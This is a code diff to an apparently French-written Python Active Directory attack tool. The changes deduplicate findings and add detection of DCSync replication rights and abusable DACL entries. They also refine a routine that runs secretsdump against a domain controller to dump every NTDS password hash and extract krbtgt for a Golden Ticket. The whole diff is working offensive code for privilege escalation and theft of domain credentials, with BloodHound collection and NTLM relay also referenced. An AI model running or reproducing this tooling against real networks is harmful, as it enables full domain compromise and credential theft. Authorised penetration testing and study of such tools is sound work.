@@ -487,10 +487,22 @@ def effective_creds(args, state):
     return False
 
 def add_finding(state, sev, title, detail="", host=""):
+    # dedup : evite les doublons (surtout quand --loop re-scanne)
+    key = (sev, title, host)
+    if any((f["sev"], f["title"], f["host"]) == key for f in state.get("findings", [])):
+        return
     state.setdefault("findings", []).append(
         {"sev": sev, "title": title, "detail": detail, "host": host})
     col = {"CRIT": C.R, "HIGH": C.R, "MED": C.Y, "INFO": C.GR}.get(sev, C.GR)
     log(f"    {col}{C.BD}[{sev}]{C.X} {title}" + (f" {C.GR}({host}){C.X}" if host else ""))
+
+def _once(state, key):
+    """Vrai la 1re fois seulement : evite de refaire le travail lourd en boucle."""
+    s = state.setdefault("_done", set())
+    if key in s:
+        return False
+    s.add(key)
+    return True
 
 def save_loot(args, name, content):
     path = os.path.join(args.loot, name)
@@ -1015,10 +1027,13 @@ GENERIC_ALL = 0x10000000; GENERIC_WRITE = 0x40000000
 WRITE_DACL = 0x40000; WRITE_OWNER = 0x80000; WRITE_PROP = 0x20; CTRL_ACCESS = 0x100
 EXT_RIGHTS = {
     "00299570-246d-11d0-a768-00aa006e0529": "ForceChangePassword",
-    "1131f6aa-9c07-11d1-f79f-00c04fc2dcd2": "GetChanges",
-    "1131f6ad-9c07-11d1-f79f-00c04fc2dcd2": "DCSync(GetChangesAll)",
     "bf9679c0-0de6-11d0-a285-00aa003049e2": "Self-Membership(AddMember)",
     "00000000-0000-0000-0000-000000000000": "AllExtendedRights",
+}
+# droits de REPLICATION (DCSync) -> pertinents SEULEMENT sur l'objet domaine
+REPL_GUIDS = {
+    "1131f6aa-9c07-11d1-f79f-00c04fc2dcd2": "GetChanges",
+    "1131f6ad-9c07-11d1-f79f-00c04fc2dcd2": "GetChangesAll",
 }
 # RIDs de comptes/groupes privilegies -> on ignore (ils ont des droits partout, bruit)
 PRIV_RIDS = {"500", "502", "512", "516", "518", "519", "521", "544", "548",
@@ -1041,10 +1056,22 @@ def _is_priv_sid(sid):
         return True
     return sid.rsplit("-", 1)[-1] in PRIV_RIDS
 
-def _dangerous_ace(ace):
-    """(sid_principal, [droits]) si l'ACE accorde un droit abusable, sinon None."""
+def _ace_guid(a):
+    try:
+        if "ObjectType" in a.fields and a["ObjectType"]:
+            from impacket.uuid import bin_to_string
+            return bin_to_string(a["ObjectType"]).lower()
+    except Exception:
+        pass
+    return None
+
+def _dangerous_ace(ace, allow_inherited=False):
+    """(sid_principal, [droits]) si l'ACE accorde un droit abusable, sinon None.
+    Ignore les ACE HERITEES (evite l'amplification x50 du meme grant sur tous les objets)."""
     try:
         if ace["AceType"] not in (0x00, 0x05):   # ALLOWED / ALLOWED_OBJECT seulement
+            return None
+        if not allow_inherited and (ace["AceFlags"] & 0x10):   # INHERITED_ACE -> skip
             return None
         a = ace["Ace"]
         mask = a["Mask"]["Mask"]
@@ -1056,16 +1083,28 @@ def _dangerous_ace(ace):
     if mask & GENERIC_WRITE: rights.append("GenericWrite")
     if mask & WRITE_DACL:   rights.append("WriteDACL")
     if mask & WRITE_OWNER:  rights.append("WriteOwner")
-    guid = None
-    try:
-        if "ObjectType" in a.fields and a["ObjectType"]:
-            from impacket.uuid import bin_to_string
-            guid = bin_to_string(a["ObjectType"]).lower()
-    except Exception:
-        guid = None
-    if guid and guid in EXT_RIGHTS and (mask & CTRL_ACCESS or mask & WRITE_PROP):
+    guid = _ace_guid(a)
+    # extended rights EXPLOITABLES (la replication est traitee a part -> DCSync)
+    if guid and guid in EXT_RIGHTS and guid not in REPL_GUIDS and (mask & CTRL_ACCESS or mask & WRITE_PROP):
         rights.append(EXT_RIGHTS[guid])
     return (sid, rights) if rights else None
+
+def _replication_ace(ace):
+    """DCSync : GetChanges / GetChangesAll (ou AllExtendedRights) sur l'objet domaine."""
+    try:
+        if ace["AceType"] not in (0x00, 0x05):
+            return None
+        a = ace["Ace"]
+        mask = a["Mask"]["Mask"]
+        sid = a["Sid"].formatCanonical()
+        if not (mask & CTRL_ACCESS):
+            return None
+    except Exception:
+        return None
+    guid = _ace_guid(a)
+    if guid == "00000000-0000-0000-0000-000000000000":   # AllExtendedRights -> inclut la replication
+        return (sid, "GetChangesAll")
+    return (sid, REPL_GUIDS[guid]) if guid in REPL_GUIDS else None
 
 def ldap_acl_scan(conn, base, state):
     if not have_lib("impacket"):
@@ -1096,9 +1135,31 @@ def ldap_acl_scan(conn, base, state):
         if sid.startswith("S-1-5-21") and sid.count("-") >= 7:
             state["domain_sid"] = sid.rsplit("-", 1)[0]
             break
-    # 2) lecture des DACL (sdflags=0x04 -> uniquement la DACL)
     ctrl = security_descriptor_control(sdflags=0x04)
-    n = 0
+    # 2a) DCSync : droits de replication sur l'objet DOMAINE -> 1 finding par principal
+    try:
+        from ldap3 import BASE
+        conn.search(base, "(objectClass=*)", search_scope=BASE,
+                    attributes=["nTSecurityDescriptor"], controls=ctrl)
+        if conn.entries:
+            raw = getattr(conn.entries[0], "nTSecurityDescriptor", None)
+            if raw and raw.raw_values:
+                sd = SR_SECURITY_DESCRIPTOR(); sd.fromString(raw.raw_values[0])
+                repl = {}
+                for ace in sd["Dacl"].aces:
+                    r = _replication_ace(ace)
+                    if r and not _is_priv_sid(r[0]):
+                        repl.setdefault(r[0], set()).add(r[1])
+                for psid, rights in repl.items():
+                    if "GetChangesAll" in rights:
+                        pname = sid_map.get(psid, psid)
+                        add_finding(state, "CRIT", f"DCSync : {pname} peut repliquer le domaine",
+                                    "secretsdump.py -just-dc (dump NTDS -> krbtgt/admin)")
+                        state.setdefault("bloodhound", {}).setdefault("dcsync", []).append(pname)
+    except Exception:
+        pass
+    # 2b) ACL abusables sur users/groups (ACE EXPLICITES uniquement) -> deduplique
+    abuse = {}   # (pname, right) -> set(targets)
     try:
         for e in ldap_search_all(conn, base, "(|(objectClass=user)(objectClass=group))",
                                  ["sAMAccountName", "nTSecurityDescriptor"], controls=ctrl):
@@ -1118,18 +1179,24 @@ def ldap_acl_scan(conn, base, state):
                 if _is_priv_sid(psid):
                     continue
                 pname = sid_map.get(psid, psid)
-                n += 1
-                add_finding(state, "CRIT",
-                            f"ACL abusable : {pname} -> {'/'.join(rights)} sur {target}",
-                            "abus DACL (ForceChangePassword / WriteDACL->DCSync / AddMember)")
-                state.setdefault("acl_paths", []).append(
-                    {"from": pname, "rights": rights, "to": target})
+                for right in rights:
+                    abuse.setdefault((pname, right), set()).add(target)
     except Exception as e:
         log(f"{C.GR}    (scan DACL partiel : {e}){C.X}")
-    if n == 0:
+    # 1 finding par (principal, droit) avec le nombre d'objets (fini le spam)
+    for (pname, right), targets in sorted(abuse.items(), key=lambda kv: -len(kv[1])):
+        nb = len(targets)
+        sev = "CRIT" if right in ("GenericAll", "WriteDACL", "WriteOwner",
+                                  "ForceChangePassword", "AllExtendedRights") else "HIGH"
+        sample = ", ".join(sorted(targets)[:4]) + (f" (+{nb-4})" if nb > 4 else "")
+        add_finding(state, sev, f"ACL : {pname} -> {right} sur {nb} objet(s)", f"ex: {sample}")
+        state.setdefault("acl_paths", []).append(
+            {"from": pname, "rights": [right], "to": sorted(targets)[0], "count": nb})
+    ndc = len(state.get("bloodhound", {}).get("dcsync", []))
+    if not abuse and not ndc:
         log(f"{C.GR}    -> aucune ACL abusable evidente (hors comptes privilegies).{C.X}")
     else:
-        log(f"{C.G}    -> {n} droit(s) abusable(s) trouve(s) !{C.X}")
+        log(f"{C.G}    -> {len(abuse)} droit(s) abusable(s) + {ndc} DCSync{C.X}")
 
 def phase3_authenum(hosts, args, state):
     stage("PHASE 3 - ENUM AUTHENTIFIEE")
@@ -1170,11 +1237,11 @@ def phase3_authenum(hosts, args, state):
                         if c["deleg"]:
                             add_finding(state, "HIGH", f"Delegation sur {c['name']} : {'+'.join(c['deleg'])}",
                                         "abus RBCD/unconstrained", dc)
-                    # mini-BloodHound : ACL/DACL abusables (GenericAll/WriteDACL...)
-                    ldap_acl_scan(conn, base, state)
-                    # LAPS lisible + trusts de domaine (cross-domaine)
-                    read_laps(conn, base, state)
-                    enum_trusts(conn, base, state)
+                    # mini-BloodHound : ACL/DACL + LAPS + trusts (une seule fois par domaine)
+                    if _once(state, f"acl:{base}"):
+                        ldap_acl_scan(conn, base, state)
+                        read_laps(conn, base, state)
+                        enum_trusts(conn, base, state)
                 except Exception as e:
                     log(f"{C.GR}    (dump LDAP partiel : {e}){C.X}")
             conn.unbind()
@@ -1257,8 +1324,8 @@ def phase3_authenum(hosts, args, state):
             add_finding(state, "HIGH", "Delegation(s) exploitables (findDelegation)",
                         out[:200], dc)
 
-    # BloodHound collection
-    if have("bloodhound-python") and args.domain:
+    # BloodHound collection (une seule fois par domaine, meme en boucle)
+    if have("bloodhound-python") and args.domain and _once(state, f"bh:{args.domain}"):
         log(f"{C.GR}[i] bloodhound-python : collecte (chemins vers DA)...{C.X}")
         cmd = ["bloodhound-python", "-d", args.domain, "-u", args.user, "-dc", dc,
                "-c", "All", "--zip", "-op", os.path.join(args.loot, "bh")]
@@ -1476,6 +1543,8 @@ def extract_krbtgt(ntds_file, state):
 # DCSYNC (secretsdump -just-dc) : l'endgame
 # ======================================================================
 def dcsync_dump(args, state, dc):
+    if state.get("hashes", {}).get("ntds"):
+        return   # deja dumpe (evite de refaire en boucle)
     if args.safe or not args.yes:
         if state.get("bloodhound", {}).get("dcsync"):
             log(f"{C.Y}[i] Droits DCSync dispo -> lance avec --yes (pas --safe) pour dumper le domaine.{C.X}")
@@ -1485,14 +1554,20 @@ def dcsync_dump(args, state, dc):
         return
     tgt, extra = impacket_creds(args)
     outb = os.path.join(args.loot, "domain_ntds")
+    ntds = outb + ".ntds"
+    try:                       # retire un eventuel dump precedent -> le check reflete CE run
+        os.remove(ntds)
+    except OSError:
+        pass
     log(f"{C.R}{C.BD}[i] DCSync : dump complet du domaine (secretsdump -just-dc)...{C.X}")
     rc, out, _ = run_cmd(["secretsdump.py", f"{tgt}@{dc}", "-just-dc", "-outputfile", outb] + extra, 600)
-    if os.path.isfile(outb + ".ntds") or "krbtgt" in out.lower():
+    if (os.path.isfile(ntds) and os.path.getsize(ntds) > 0) or "krbtgt:" in out.lower():
         add_finding(state, "CRIT", "DCSync reussi : hashes NTDS du domaine dumpes",
-                    f"{outb}.ntds (krbtgt -> Golden Ticket possible)", dc)
-        state.setdefault("hashes", {})["ntds"] = outb + ".ntds"
-        # ferme la boucle : extrait krbtgt -> commande Golden Ticket prete
-        extract_krbtgt(outb + ".ntds", state)
+                    f"{ntds} (krbtgt -> Golden Ticket possible)", dc)
+        state.setdefault("hashes", {})["ntds"] = ntds
+        extract_krbtgt(ntds, state)   # ferme la boucle : krbtgt -> commande Golden Ticket
+    else:
+        log(f"{C.GR}    -> DCSync refuse avec {args.user} (droits insuffisants).{C.X}")
 
 # ======================================================================
 # COERCION + NTLM RELAY (PetitPotam / Coercer -> ntlmrelayx)
